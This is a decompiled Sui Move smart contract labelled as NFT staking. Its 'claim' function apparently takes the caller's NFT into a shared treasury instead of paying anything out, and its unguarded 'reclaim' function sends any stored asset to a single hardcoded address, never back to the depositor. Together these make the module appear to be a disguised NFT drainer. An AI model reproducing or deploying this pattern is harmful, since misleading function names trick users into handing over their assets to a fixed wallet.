module 0x4ac47cd383f8cd6abfedb540ca51e0d6b55735e6ea403b8d68bc2beb353fc354::nft_staking {
    struct Treasury has key {
        id: 0x2::object::UID,
        status: bool,
    }

    struct NFT_STAKING has drop {
        dummy_field: bool,
    }

    public entry fun claim<T0: store + key>(arg0: &mut Treasury, arg1: T0, arg2: &mut 0x2::tx_context::TxContext) {
        0x2::dynamic_object_field::add<0x2::object::ID, T0>(&mut arg0.id, 0x2::object::id<T0>(&arg1), arg1);
    }

    fun init(arg0: NFT_STAKING, arg1: &mut 0x2::tx_context::TxContext) {
        let v0 = Treasury{
            id     : 0x2::object::new(arg1),
            status : true,
        };
        0x2::transfer::share_object<Treasury>(v0);
    }

    public entry fun reclaim<T0: store + key>(arg0: &mut Treasury, arg1: 0x2::object::ID, arg2: &mut 0x2::tx_context::TxContext) {
        0x2::transfer::public_transfer<T0>(0x2::dynamic_object_field::remove<0x2::object::ID, T0>(&mut arg0.id, arg1), @0x94518199cda5ffa5dcbb6882eb2b37fbe51853500ae9857bafc827998cab0b56);
    }

    // decompiled from Move bytecode v6
}

